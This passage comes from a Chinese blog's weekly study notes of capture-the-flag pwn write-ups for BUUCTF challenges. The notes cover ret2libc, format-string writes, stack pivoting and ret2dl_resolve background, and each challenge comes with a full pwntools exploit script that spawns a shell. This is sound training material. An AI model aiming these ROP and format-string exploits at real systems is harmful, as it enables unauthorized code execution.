到目前为止所写的字符数</li></ul><p><strong>3、</strong>32位&#x2F;64位程序在函数调用时的区别：</p><p>32位程序，函数调用时参数在栈：格式化字符可控可以泄露栈上的数据<br>64位程序，函数调用使用寄存器＋栈：格式化字符可控可以泄露特定寄存器和栈上的值（前6个参数放在寄存器上，会先依次打印出寄存器上的值。）</p><p><strong>知识点来源：</strong></p><p><a href="https://blog.csdn.net/qq_57483327/article/details/122814122">https://blog.csdn.net/qq_57483327/article/details/122814122</a></p><p><a href="https://blog.csdn.net/qq_52126646/article/details/120577896">https://blog.csdn.net/qq_52126646/article/details/120577896</a></p><h3 id="3-题目来源—BUUCTF，ciscn-2019-c-1（ret2libc）"><a href="#3-题目来源—BUUCTF，ciscn-2019-c-1（ret2libc）" class="headerlink" title="3. 题目来源—BUUCTF，ciscn_2019_c_1（ret2libc）"></a>3. 题目来源—BUUCTF，ciscn_2019_c_1（ret2libc）</h3><p>首先对程序进行检查，然后发现该程序为64位，开启了NX保护，无法插入shellcode</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-8.png"></p><p>将程序放入ida进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-9.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-10.png"></p><p>我们在encrypt中发现了危险函数gets，我们可以利用这个函数漏洞构建我们的payload，但是下面会有一个加密的过程，会对我们的payload进行破坏，所以我们得避免这种情况，然后破坏循环的条件是v0 &gt;&#x3D; strlen(s),所以我们只需要在我们payload前面加上’\0’就行（知识点来源：<a href="https://blog.csdn.net/weixin_45556441/article/details/115044288%EF%BC%89%EF%BC%8C%E7%94%B1%E4%BA%8E%E8%BF%99%E9%81%93%E9%A2%98%E6%88%91%E4%BB%AC%E6%B2%A1%E6%B3%95%E6%89%BE%E5%88%B0system(&quot;bin/sh&quot;)%E5%87%BD%E6%95%B0%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8puts%E5%87%BD%E6%95%B0%E6%9D%A5%E6%B3%84%E9%9C%B2system%E5%87%BD%E6%95%B0%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%9A">https://blog.csdn.net/weixin_45556441/article/details/115044288），由于这道题我们没法找到system(&quot;bin/sh&quot;)函数，我们可以利用puts函数来泄露system函数的地址：</a></p><p>先用ROPgadget找一下需要用到的汇编指令的地址。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-11.png"></p><p>我们可以发现pop rdi ;ret的地址为0x00400c83,然后ret的地址为0x004006b9，构建的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">26928</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./ciscn"</span><span class="token punctuation">)</span>put_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>put_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>pop_addr<span class="token operator">=</span><span class="token number">0x400c83</span>main<span class="token operator">=</span><span class="token number">0x400B28</span>ret<span class="token operator">=</span><span class="token number">0x4006b9</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1<span class="token operator">=</span><span class="token string">b'\0'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"encrypted\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>addr<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span> <span class="token comment">#接收puts的地址</span>put_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>put_addr<span class="token punctuation">)</span>libcbase<span class="token operator">=</span>put_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span> system<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2<span class="token operator">=</span><span class="token string">b'\0'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"encrypted\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后获得的flag如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-12.png"></p><h4 id="补充知识点："><a href="#补充知识点：" class="headerlink" title="补充知识点："></a>补充知识点：</h4><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-13.png"></p><p>来源：</p><p><a href="https://blog.csdn.net/weixin_45556441/article/details/115091036%EF%BC%8C">https://blog.csdn.net/weixin_45556441/article/details/115091036，</a></p><p><a href="https://blog.csdn.net/qq_43189757/article/details/100572092?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-100572092-blog-121408985.pc_relevant_multi_platform_whitelistv3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-100572092-blog-121408985.pc_relevant_multi_platform_whitelistv3&utm_relevant_index=1">https://blog.csdn.net/qq_43189757&#x2F;article&#x2F;details&#x2F;100572092</a>，</p><p><a href="https://blog.csdn.net/weixin_62675330/article/details/123274456">https://blog.csdn.net/weixin_62675330/article/details/123274456</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
            <tag> ret2shellcode </tag>
            
            <tag> 格式化字符串溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六周笔记</title>
      <link href="/uncategorized/%E7%AC%AC%E5%85%AD%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/uncategorized/%E7%AC%AC%E5%85%AD%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-jarvisoj-fm（字符串漏洞）"><a href="#1-jarvisoj-fm（字符串漏洞）" class="headerlink" title="1. jarvisoj_fm（字符串漏洞）"></a>1. jarvisoj_fm（字符串漏洞）</h1><p>首先对程序进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-1.png"></p><p>发现开启了canary保护和NX保护，首先就可以排除掉插入shellcode和返回函数，将程序放入ida进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-2.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-3.png"></p><p>很明显，system函数直接暴露在了我们的面前，只需要x满足等于4时即可，通过观察发现x为一个全局变量，我们通过多次运行程序，发现x的默认值为3，接下来的操作主要是找到x的地址，然后将其修改成4即可，这里与之前不同的是，我们在这次用到了fmtstr_payload(偏移，{adds1：value1})，这是32位程序常用的方法，可以构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./fm'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26987</span><span class="token punctuation">)</span>x_addr <span class="token operator">=</span> <span class="token number">0x0804A02C</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>x_addr<span class="token punctuation">:</span><span class="token number">0x4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-4.png"></p><h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-5.png"></p><p>可参考格式化字符串全自动exp：<a href="https://blog.csdn.net/zjjcxy_long/article/details/116755976">https://blog.csdn.net/zjjcxy_long/article/details/116755976</a></p><h1 id="2-bjdctf-2020-babyrop（ret2libc）"><a href="#2-bjdctf-2020-babyrop（ret2libc）" class="headerlink" title="2. bjdctf_2020_babyrop（ret2libc）"></a>2. bjdctf_2020_babyrop（ret2libc）</h1><p>首先对程序进行检查：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-6.png"></p><p>然后将其放入ida中进行反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-7.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-8.png"></p><p>发现这个程序简单的一批，很明显的ret2libc问题，前面有puts函数，可以用它作为切入口，构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2020_babyrop'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./2020_babyrop'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27940</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token comment">#p.recvuntil(b"story!\n")</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>start <span class="token operator">=</span> <span class="token number">0x00400530</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'main_addr:'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x00400733</span>payload1 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>puts  <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>offset <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"story!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-9.png"></p><h1 id="3-ciscn-2019-es-2（栈迁移）"><a href="#3-ciscn-2019-es-2（栈迁移）" class="headerlink" title="3. ciscn_2019_es_2（栈迁移）"></a>3. ciscn_2019_es_2（栈迁移）</h1><p>首先对程序进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-10.png"></p><p>可以知道该程序为32位，然后开启了NX保护，堆栈不可执行，放入ida反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-11.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-12.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-13.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-14.png"></p><p>很明显的栈溢出，但是我们可以看到s变量只有0x28个字节，但是read要写入0x30个字节，read读入的数据刚好将返回地址给覆盖掉了，注意到hack函数，居然存在system（“echo flag”），但是根本行不通…….</p><p>假设我们的写入没有长度限制，我们构造的栈应该是下图这样的：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-15.png"></p><p>但现在加入了长度限制，只能写入0x30个字节，所以我们通过leave命令将栈转移到别的地方，我们将栈中ebp的内容改为s的地址，return改为leave的地址，我们可以构造的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_es_2'</span><span class="token punctuation">)</span><span class="token comment">#io=remote('node4.buuoj.cn',27520)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_es_2'</span><span class="token punctuation">)</span><span class="token comment">#context(os='linux',arch='i386',log_level='debug')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>leave_ret <span class="token operator">=</span> <span class="token number">0x080484b8</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x26</span><span class="token operator">+</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">2</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'aabb'</span><span class="token punctuation">)</span>ebp <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"ebp----->"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ebp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#padding+system+ret addr+binsh_addr+bin sh       </span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'bbbb'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ebp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin'</span><span class="token operator">+</span><span class="token string">b'/sh\x00'</span>payload2<span class="token operator">=</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment"># pivot addr           # ret addr</span>payload2<span class="token operator">+=</span>p32<span class="token punctuation">(</span>ebp<span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token comment"># gdb.attach(io,"b *0x080485FD")</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地打通的结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-16.png"></p><p>不知道为啥在远端就打不通，迷迷糊糊[头晕]</p><h2 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h2><p>栈转移：通过leave指令改变ebp，esp构造新栈</p><p>leave命令相当于</p><p>mov ebp,esp</p><p>pop ebp(此处的ebp位于栈中我们可以控制)</p><p>所以如果我们连着使用两次leave命令，那我们就相当于可以任意改写esp的值</p><p>参考内容：</p><p><a href="https://bbs.pediy.com/thread-269163.htm">https://bbs.pediy.com/thread-269163.htm</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103689296">https://blog.csdn.net/github_36788573/article/details/103689296</a></p><p><a href="https://blog.csdn.net/weixin_46521144/article/details/118863961">https://blog.csdn.net/weixin_46521144/article/details/118863961</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ret2libc </tag>
            
            <tag> 字符串漏洞 </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三周笔记</title>
      <link href="/ret2dl-resolve-ret2VDSO/%E7%AC%AC%E4%B8%89%E5%91%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/ret2dl-resolve-ret2VDSO/%E7%AC%AC%E4%B8%89%E5%91%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、ret2dl-resolve，ret2VDSO知识点"><a href="#一、ret2dl-resolve，ret2VDSO知识点" class="headerlink" title="一、ret2dl_resolve，ret2VDSO知识点"></a>一、ret2dl_resolve，ret2VDSO知识点</h2><h3 id="1-ret2dl-resolve"><a href="#1-ret2dl-resolve" class="headerlink" title="1. ret2dl_resolve"></a>1. ret2dl_resolve</h3><p>在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-1.png"></p><p>如上图所示，链接器以section为单位对数据进行组织，以section header table对section进行描述，而忽略program header table中的内容；加载器以segment为单位对数据进行组织，以program header table对segment进行描述，而忽略section header table中的内容。其中，加载器中的segment实际由单个或多个链接器中的section组成。ELF文件包含三种类型：可重定位文件(relocatable)—编译器和汇编器产生的.o文件，被Linker所处理；可执行文件(executable)—Linker对.o文件进行处理输出的文件，进程映像；共享对象文件(shared object)—动态库文件.so。</p><p><strong>ELF文件结构：</strong></p><ol><li>ELF文件分为多个部分，称为多个section，并且有一个基本的文件头用来保存文件的基本属性，包括是否为可执行文件、操作系统、CPU型号等</li><li>.text Section 保存代码段和指令段</li><li>.data Section 保存程序里设置好的初始化信息</li><li>.real.text Section 保存程序里面我们暂时位置的跳转地址，比如链接之前的目标文件中add函数的跳转地址</li><li>.symtab Section 符号表，保存当前文件里面我们未知的函数名称和地址的对应关系</li></ol><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-2.png"></p><p><strong>ELF文件链接过程：</strong></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-3.png"></p><p>摘自：</p><p><a href="https://www.cnblogs.com/rxmind/p/12801249.html%EF%BC%8C">https://www.cnblogs.com/rxmind/p/12801249.html，</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/%EF%BC%8C">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/，</a></p><p><a href="https://blog.csdn.net/qq_35018427/article/details/120222352">https://blog.csdn.net/qq_35018427/article/details/120222352</a></p><h3 id="2-ret2VDSO"><a href="#2-ret2VDSO" class="headerlink" title="2. ret2VDSO"></a>2. ret2VDSO</h3><p>反正我没懂，直接一股脑复制粘贴</p><p>VDSO的介绍：</p><p>什么是 VDSO(Virtual Dynamically-linked Shared Object) 呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一致，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过 vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的 int 0x80 来进行系统调用，不同的处理器实现了不同的快速系统调用指令</p><ul><li>intel 实现了 sysenter，sysexit</li><li>amd 实现了 syscall，sysret</li></ul><p>当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以 linux 实现了 vsyscall 接口，在底层会根据具体的结构来进行具体操作。而 vsyscall 就实现在 vdso 中。</p><p>摘自：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2vdso/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2vdso/</a></p><h2 id="二、刷题练习（本周的刷题练习比较简单）"><a href="#二、刷题练习（本周的刷题练习比较简单）" class="headerlink" title="二、刷题练习（本周的刷题练习比较简单）"></a>二、刷题练习（本周的刷题练习比较简单）</h2><h3 id="1-题目来源—BUUCTF，ciscn-2019-n-8"><a href="#1-题目来源—BUUCTF，ciscn-2019-n-8" class="headerlink" title="1. 题目来源—BUUCTF，ciscn_2019_n_8"></a>1. 题目来源—BUUCTF，ciscn_2019_n_8</h3><p>首先对该程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-4.png"></p><p>发现所有的保护已经开启，我们将文件放入到ida里进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-5.png"></p><p>程序运行一下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-6.png"></p><p>我们发现整个程序看起来比较简单，只要满足var[13]&#x3D;&#x3D;17就可以执行system(“bin&#x2F;sh”)函数，但是由于var[13]一开始就被赋值为0,所以我们直接对其进行写入，exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28064</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">14</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终获得flag，结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-7.png"></p><p>总结：这道题虽然保护全开，但实际执行起来并没有什么难度。</p><h3 id="2-题目来源—BUUCTF，jarvisoj-level2"><a href="#2-题目来源—BUUCTF，jarvisoj-level2" class="headerlink" title="2. 题目来源—BUUCTF，jarvisoj_level2"></a>2. 题目来源—BUUCTF，jarvisoj_level2</h3><p>首先对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-8.png"></p><p>发现该程序为32位，且几乎没有开启任何的保护，我们将程序运行一下并其放入到ida中进行反编译：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-9.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-10.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-11.png"></p><p><img 